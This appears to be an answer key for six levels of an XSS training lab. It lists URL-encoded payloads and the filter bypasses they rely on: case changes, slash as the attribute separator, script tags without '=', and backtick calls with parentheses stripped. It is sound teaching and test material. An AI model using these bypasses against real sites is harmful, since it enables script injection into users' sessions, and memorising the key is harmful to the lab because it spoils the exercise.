# obfuscation — solutions

Server-side case/space/char-stripping that fails against case-insensitive HTML or alt syntax.

### obfuscation-level1

`/obfuscation/level1/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: input lowercased then body reflection; lowercase payload OK

### obfuscation-level2

`/obfuscation/level2/?query=%3CIMG%20SRC%3DX%20ONERROR%3DALERT(1)%3E`

- payload: `<IMG SRC=X ONERROR=ALERT(1)>`
- context: input uppercased then body reflection; HTML is case-insensitive

### obfuscation-level3

`/obfuscation/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: original copy reflected unmodified alongside reversed copy

### obfuscation-level4

`/obfuscation/level4/?query=%3Cimg%2Fsrc%3Dx%2Fonerror%3Dalert(1)%3E`

- payload: `<img/src=x/onerror=alert(1)>`
- context: spaces stripped; use / as attribute separator

### obfuscation-level5

`/obfuscation/level5/?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: = stripped; script tag needs no = for body content

### obfuscation-level6

`/obfuscation/level6/?query=%3Cimg%20src%3Dx%20onerror%3Dalert%601%60%3E`

- payload: `<img src=x onerror=alert\`1\`>`
- context: ( and ) stripped; use backticks for tagged template call
